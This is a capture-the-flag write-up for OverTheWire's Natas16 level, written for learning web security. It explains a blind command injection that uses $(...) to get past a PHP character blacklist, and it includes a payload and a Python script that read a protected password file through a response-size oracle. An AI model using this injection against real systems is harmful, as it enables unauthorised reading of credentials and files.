# Natas15 → Natas16 Writeup (OverTheWire)

**Challenge:** [OverTheWire Natas Wargame](http://overthewire.org/wargames/natas/) — Level 16
**Category:** Web Exploitation / Blind Command Injection
**Difficulty:** Medium

---

## Challenge Overview

Natas16 presents a simple web form that lets users search a dictionary file for words containing a given substring. The backend PHP code is shown to us via "View sourcecode":

```php
<?
ini_set('pcre.jit', 0);
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

The user-supplied `needle` parameter is passed into a shell command via `passthru()`. A blacklist filters out the characters:

```
;  |  &  `  '  "
```

Our goal: read `/etc/natas_webpass/natas17` despite this filter, without ever seeing the command's raw output directly (since only `grep` results against `dictionary.txt` are shown to us).

---

## Vulnerability Analysis

The blacklist blocks classic command-chaining characters (`;`, `|`, `&`) and quote characters used to break out of the double-quoted string (`'`, `"`, `` ` ``).

However, it does **not** block:

- `$( ... )` — command substitution
- Spaces, letters, digits, `/`, `^`

Since our input is placed inside double quotes in the shell command:

```bash
grep -i "$key" dictionary.txt
```

`$(...)` still gets expanded by the shell **even inside double quotes**. This gives us command substitution without needing any of the blacklisted characters.

### The blind oracle trick

We can't see command output directly — only whether `grep` matches something in `dictionary.txt`. So we build a **boolean oracle** out of that behavior:

```
needle = $(grep ^p /etc/natas_webpass/natas17)
```

The server executes:

```bash
grep -i "$(grep ^p /etc/natas_webpass/natas17)" dictionary.txt
```

Two possible outcomes:

1. **If the password starts with `p`** → the inner `grep` finds the line and returns the real (random) password string. The outer command becomes `grep -i "<random_password>" dictionary.txt`, which won't match any English dictionary word → **empty / short response**.
2. **If the password does *not* start with `p`** → the inner `grep` matches nothing, so the substitution evaluates to an empty string. The outer command becomes `grep -i "" dictionary.txt`, and an empty pattern matches **every line** → **huge response** (entire dictionary dumped back).

So:

| Response size | Meaning |
|---|---|
| Small/empty | Prefix guess is **correct** |
| Large (full dictionary) | Prefix guess is **wrong** |

This lets us brute-force the password one character at a time using `^<prefix>` as an anchored regex, without ever needing a banned character.

---

## Exploit Script

```python
import requests
import string
import time

url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "<natas16_password>")
charset = string.ascii_letters + string.digits

def safe_get(params, retries=5):
    for attempt in range(retries):
        try:
            return requests.get(url, auth=auth, params=params, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"  (retrying after error: {e})")
            time.sleep(1)
    raise RuntimeError("Failed after multiple retries")

found = ""
for _ in range(32):  # Natas passwords are 32 characters
    for c in charset:
        guess = found + c
        needle = f"$(grep ^{guess} /etc/natas_webpass/natas17)"
        r = safe_get({"needle": needle})
        if len(r.text) < 5000:   # tune threshold against your own instance
            found += c
            print(found)
            break
    else:
        break

print("Password:", found)
```

### Notes on running it

- **Calibrate the threshold first.** Test one deliberately wrong guess and compare `len(r.text)` against a known-correct prefix to pick a safe cutoff between "empty" and "full dictionary dump."
- **Retry wrapper** handles occasional `ConnectionResetError` from the lab's Apache instance under repeated requests.
- **Anchoring with `^`** ensures we're matching a prefix, not a substring anywhere in the file.
- Natas passwords are alphanumeric, so no regex-special characters need escaping in the guesses.

---

## ✅ Result

Running the script recovers the 32-character password for `natas17` character by character, purely from response-size differences — a classic **blind, boolean-based command injection**.

---

## Takeaways

- **Blacklisting characters is not equivalent to preventing shell injection.** `$(...)` command substitution survives even when quotes and chaining operators are blocked.
- **Blind vulnerabilities can still be fully exploited** by turning any observable side channel (response size, timing, HTTP status) into a boolean oracle.
- **Defense in depth matters:** proper fixes would include avoiding shell interpolation entirely (e.g., using `escapeshellarg()`, or better, calling `grep` via `exec()`/`proc_open()` with an argument array rather than a shell string).

---

*This writeup documents a solution to a challenge on [OverTheWire's Natas wargame](http://overthewire.org/wargames/natas/), a legal platform designed for learning web security concepts.*